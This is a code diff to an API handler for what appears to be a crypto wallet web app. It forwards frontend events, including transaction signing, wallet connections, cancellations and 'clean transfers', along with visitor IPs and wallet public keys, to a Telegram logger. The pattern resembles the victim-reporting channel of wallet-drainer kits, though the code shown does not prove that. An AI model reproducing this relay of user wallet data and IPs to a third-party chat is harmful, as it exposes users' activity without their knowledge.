@@ -20,61 +20,111 @@ export default async function handler(req, res) {
 
   try {
     const logData = req.body;
+    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
     
     // Log to console for debugging
     console.log('[API_LOG]', JSON.stringify(logData, null, 2));
     
-    // Forward to Telegram based on log type
+    // Forward to Telegram based on log type with enhanced data
     try {
       const logType = logData.type || 'FRONTEND_LOG';
+      const enhancedData = {
+        ...logData,
+        ip: clientIP,
+        timestamp: logData.timestamp || new Date().toISOString()
+      };
       
       switch (logType) {
         case 'TRANSACTION_SIGNING':
-          await telegramLogger.logSigningError({
-            publicKey: logData.publicKey || 'Unknown',
-            walletType: logData.walletType || 'Unknown',
-            errorType: 'Transaction Signing',
-            errorMessage: logData.error || logData.message || 'Unknown error',
-            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown'
-          });
+          await telegramLogger.logTransactionSigning(enhancedData);
           break;
           
         case 'API_CALL':
-          await telegramLogger.logError({
-            publicKey: logData.publicKey || 'Unknown',
-            walletType: logData.walletType || 'Unknown',
-            error: logData.error || logData.message || 'Unknown error',
-            context: logData.context || 'API Call',
-            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown'
-          });
+          await telegramLogger.logAPICall(enhancedData);
           break;
           
         case 'WALLET_CONNECTION':
-          await telegramLogger.logConnectionError({
-            publicKey: logData.publicKey || 'Unknown',
-            walletType: logData.walletType || 'Unknown',
-            errorMessage: logData.error || logData.message || 'Unknown connection error',
-            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown'
-          });
+          await telegramLogger.logWalletConnection(enhancedData);
           break;
           
         case 'USER_CANCELLATION':
-          await telegramLogger.logTransactionCancelled({
-            publicKey: logData.publicKey || 'Unknown',
-            walletType: logData.walletType || 'Unknown',
-            reason: logData.action || 'User cancelled',
-            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown'
-          });
+          await telegramLogger.logTransactionCancelled(enhancedData);
+          break;
+          
+        case 'FRONTEND_ERROR':
+          await telegramLogger.logFrontendError(enhancedData);
+          break;
+          
+        case 'RPC_FAILURE':
+          await telegramLogger.logRPCFailure(enhancedData);
+          break;
+          
+        case 'CONNECTION_ERROR':
+          await telegramLogger.logConnectionError(enhancedData);
+          break;
+          
+        case 'VALIDATION':
+          await telegramLogger.logValidation(enhancedData);
+          break;
+          
+        case 'SIMULATION':
+          await telegramLogger.logSimulation(enhancedData);
+          break;
+          
+        case 'TOKEN_PROCESSING':
+          await telegramLogger.logTokenProcessing(enhancedData);
+          break;
+          
+        case 'CONFIGURATION':
+          await telegramLogger.logConfiguration(enhancedData);
+          break;
+          
+        case 'PERFORMANCE':
+          await telegramLogger.logPerformance(enhancedData);
+          break;
+          
+        case 'SECURITY':
+          await telegramLogger.logSecurity(enhancedData);
+          break;
+          
+        case 'BUSINESS_LOGIC':
+          await telegramLogger.logBusinessLogic(enhancedData);
+          break;
+          
+        case 'SYSTEM_EVENT':
+          await telegramLogger.logSystemEvent(enhancedData);
+          break;
+          
+        case 'MOBILE_WALLET':
+          await telegramLogger.logMobileWallet(enhancedData);
+          break;
+          
+        case 'CIRCUIT_BREAKER':
+          await telegramLogger.logCircuitBreaker(enhancedData);
+          break;
+          
+        case 'EMERGENCY_FALLBACK':
+          await telegramLogger.logEmergencyFallback(enhancedData);
+          break;
+          
+        case 'PRE_INITIALIZATION':
+          await telegramLogger.logPreInitialization(enhancedData);
+          break;
+          
+        case 'CLEAN_TRANSFER':
+          await telegramLogger.logCleanTransfer(enhancedData);
+          break;
+          
+        case 'CONNECTION_HEALTH':
+          await telegramLogger.logConnectionHealth(enhancedData);
           break;
           
         default:
-          // For unknown types, send as general error
-          await telegramLogger.logFrontendError({
-            error: logData.error || logData.message || 'Unknown error',
-            context: logData.context || logType,
-            url: logData.url || 'Unknown',
-            userAgent: logData.userAgent || 'Unknown',
-            timestamp: logData.timestamp || new Date().toISOString()
+          // For unknown types, send as unknown event
+          await telegramLogger.logUnknownEvent({
+            event: logType,
+            data: enhancedData,
+            ip: clientIP
           });
           break;
       }
